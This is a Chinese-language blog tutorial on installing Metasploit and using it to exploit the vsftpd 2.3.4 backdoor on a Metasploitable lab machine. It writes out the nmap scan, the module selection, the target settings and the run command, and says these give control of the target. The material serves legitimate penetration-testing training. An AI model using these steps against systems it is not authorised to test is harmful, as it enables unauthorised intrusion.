---
title: Use metaspolit to check device vulnerability
date: 2019-2-26 08:00:00 +0800
categories: [ Security tools ]
tags: [ tools ]     # TAG names should always be lowercase
---

## 介紹
metaspolit 的名聲應該已經不用我來介紹了，如果不懂的請觀看他的[官方網站](https://www.metasploit.com/)

## 0x00 環境架設
大部份進行滲透測試的人員都會使用 kali 來當OS，因為他有豐富的滲透工具，
可以不用再自行安裝，不過其他版本的linux也是可以正常使用的
[下載教學](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)

```
教學已經很簡要的把指令放在一起，linux 使用者可以直接執行下面這行，就會自動下載以及安奘

curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
chmod 755 msfinstall && \
./msfinstall
```
由於我只是因為一些研究需要用到這套工具沒有要使用其他工具，
因此我這邊使用的是ubuntu x86_64
https://www.tutorialspoint.com/metasploit/metasploit_discovery_scans.htm

### 架設 IOT 設備
架設的方式分成幾種
1. 直接拿實體機器跟你網路對連
2. 使用 firmware 模擬的技術，模擬出一種設備
    - 相關方式我會在別的 blog 中做介紹
3. 使用 metasploitable 來簡單架設環境

## 0x01 熟悉 metaspolit
我們可以輸入 help 來快速的觀看有哪些指令是可以使用的
```
msf5 > help
```
比較常用的
- **search** : Searches module names and descriptions
- **use** :  Selects a module by name
- **back** : Move back from the current context
- **exit** : Exit the console

之後有用到其他的再補

## 0x02 實際操作
### Class 1 metasploitable ftp expolit
首先輸入 msfconsole 進入操作界面

利用nmap -sV 去掃所有開port的 services 版本資訊
![](https://i.imgur.com/zNj75Sd.png)

上網查究可以發現 vsftpd 2.3.4 這個services 是存在著backdoor的

於是我們直接搜尋 metasploit 資料庫
```
search vsFTPd 2.3.4
```
會出現幾個資料庫選項，我們選擇下面這個
```
exploit/unix/ftp/vsftpd_234_backdoor
```
使用 use 指令來指定他
```
use exploit/unix/ftp/vsftpd_234_backdoor
```

輸入下面指令來顯示可以調整的參數
```
show options
```
![](https://i.imgur.com/HGlFE2T.png)

更改 RHOSTS 為 靶機ip位址
```
set RHOSTS 192.168.77.143
```
RPORT 維持是 21 port 即可

再來我們直接輸入 run，程式就會自動執行漏洞POC，完成後就可以得到機器控制權
![](https://i.imgur.com/UTcoZhT.png)

## tutorial
請參考 https://www.tutorialspoint.com/metasploit/metasploit_discovery_scans.htm

